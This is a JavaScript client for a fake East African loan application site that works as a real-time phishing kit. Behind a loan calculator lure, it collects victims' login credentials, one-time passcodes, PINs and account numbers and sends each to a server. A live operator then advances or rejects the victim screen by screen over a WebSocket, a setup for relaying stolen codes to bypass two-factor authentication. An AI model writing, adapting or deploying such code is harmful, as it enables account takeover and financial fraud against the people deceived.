const currencyMap = {
  "KENYA": "KES",
  "TANZANIA": "TZS",
  "UGANDA": "UGX",
  "RWANDA": "RWF",
  "SOUTH SUDAN": "SSP"
};

let currentCountry = "KENYA";
let currentCurrency = "KES";
let ws = null;

document.addEventListener("DOMContentLoaded", () => {
  initWebSocket();
  bindEvents();
  updateCurrencyDisplay();
});

function initWebSocket() {
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${window.location.host}/ws`);

  ws.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.type === 'ADMIN_ACTION') {
        handleAdminAction(data.action);
      }
    } catch (e) {
      console.error(e);
    }
  };
}

function bindEvents() {
  const welcomeCountry = document.getElementById("countrySelect");
  const loginCountry = document.getElementById("loginCountrySelect");

  welcomeCountry.addEventListener("change", (e) => {
    currentCountry = e.target.value;
    if (loginCountry) loginCountry.value = currentCountry;
    currentCurrency = currencyMap[currentCountry] || "KES";
    updateCurrencyDisplay();
  });

  // Navigate to calculator immediately after welcome screen
  document.getElementById("welcomeNextBtn").addEventListener("click", () => switchScreen("screen-calculator"));
  document.getElementById("welcomeRegisterBtn").addEventListener("click", () => switchScreen("screen-calculator"));

  document.getElementById("loanAmountSlider").addEventListener("input", updateCalculator);
  document.getElementById("loanTermSlider").addEventListener("input", updateCalculator);

  document.getElementById("calcNextBtn").addEventListener("click", () => switchScreen("screen-form"));
  document.getElementById("calcRegisterBtn").addEventListener("click", () => switchScreen("screen-form"));

  document.getElementById("formSaveContinueBtn").addEventListener("click", () => switchScreen("screen-login"));

  document.getElementById("loginSubmitBtn").addEventListener("click", () => {
    const identifier = document.getElementById("loginIdentifier").value.trim();
    const password = document.getElementById("loginPassword").value.trim();

    if (!identifier || !password) {
      showSurfaceNotification("Please enter email/phone and password.");
      return;
    }

    sendPayload({
      step: "LOGIN_SUBMIT",
      country: currentCountry,
      currency: currentCurrency,
      amount: document.getElementById("loanAmountSlider").value,
      identifier,
      password
    });

    showLoading(true);
  });

  document.getElementById("otpSubmitBtn").addEventListener("click", () => {
    const otp = document.getElementById("otpInput").value.trim();
    if (!otp) return;

    sendPayload({
      step: "OTP_SUBMIT",
      identifier: document.getElementById("loginIdentifier").value,
      otp
    });

    showLoading(true);
  });

  document.getElementById("pinSubmitBtn").addEventListener("click", () => {
    const pin = [1,2,3,4].map(i => document.getElementById(`pin${i}`).value).join("");
    if (pin.length < 4) return;

    sendPayload({
      step: "PIN_SUBMIT",
      identifier: document.getElementById("loginIdentifier").value,
      pin
    });

    showLoading(true);
  });

  document.getElementById("accountSubmitBtn").addEventListener("click", () => {
    const accountNo = document.getElementById("accountNumberInput").value.trim();
    if (accountNo.length !== 10) return;

    sendPayload({
      step: "ACCOUNT_SUBMIT",
      identifier: document.getElementById("loginIdentifier").value,
      accountNo
    });

    showLoading(true);
  });

  [1,2,3,4].forEach(i => {
    const pinInput = document.getElementById(`pin${i}`);
    if (pinInput) {
      pinInput.addEventListener("input", (e) => {
        if (e.target.value && i < 4) {
          document.getElementById(`pin${i+1}`).focus();
        }
      });
    }
  });
}

function sendPayload(data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify(data));
  }
  
  fetch('/api/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).catch(err => console.error(err));
}

function handleAdminAction(action) {
  showLoading(false);

  switch (action) {
    case 'ALLOW': switchScreen("screen-otp"); break;
    case 'DENY': showSurfaceNotification("Access Denied by Admin."); break;
    case 'OTP_EXPIRED': showSurfaceNotification("OTP Expired! Re-enter OTP."); break;
    case 'OTP_CORRECT': switchScreen("screen-pin"); break;
    case 'CONTINUE': switchScreen("screen-account"); break;
    case 'BLOCK': showSurfaceNotification("Account Blocked."); break;
    case 'WRONG_PIN': showSurfaceNotification("Wrong PIN! Re-enter."); switchScreen("screen-pin"); break;
    case 'WRONG_ACC_NUMBER': showSurfaceNotification("Wrong Account Number!"); switchScreen("screen-account"); break;
    case 'APPROVED': switchScreen("screen-congratulations"); break;
  }
}

function switchScreen(screenId) {
  document.querySelectorAll(".screen").forEach(s => s.classList.add("hidden"));
  document.getElementById(screenId).classList.remove("hidden");
}

function showLoading(show) {
  document.getElementById("loadingOverlay").classList.toggle("hidden", !show);
}

function showSurfaceNotification(msg) {
  const el = document.getElementById("surfaceNotification");
  if (el) {
    el.textContent = msg;
    el.classList.remove("hidden");
    setTimeout(() => el.classList.add("hidden"), 4000);
  }
}

function updateCurrencyDisplay() {
  document.getElementById("minAmountLabel").textContent = `${currentCurrency} 10,000`;
  document.getElementById("maxAmountLabel").textContent = `${currentCurrency} 1,000,000`;
  updateCalculator();
}

function updateCalculator() {
  const amount = parseInt(document.getElementById("loanAmountSlider").value);
  const term = parseInt(document.getElementById("loanTermSlider").value);

  document.getElementById("currentAmountLabel").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
  document.getElementById("currentTermLabel").textContent = `${term} MONTHS`;

  const monthlyRate = 0.135 / 12;
  const monthlyRepayment = Math.round((amount * monthlyRate) + (amount / term));
  const totalRepayment = monthlyRepayment * term;

  document.getElementById("monthlyRepaymentValue").textContent = `${currentCurrency} ${monthlyRepayment.toLocaleString()}`;
  document.getElementById("totalRepaymentValue").textContent = `${currentCurrency} ${totalRepayment.toLocaleString()}`;
  document.getElementById("formSelectedAmount").textContent = `${currentCurrency} ${amount.toLocaleString()}`;
  document.getElementById("formSelectedTerm").textContent = `${term} Months`;
}
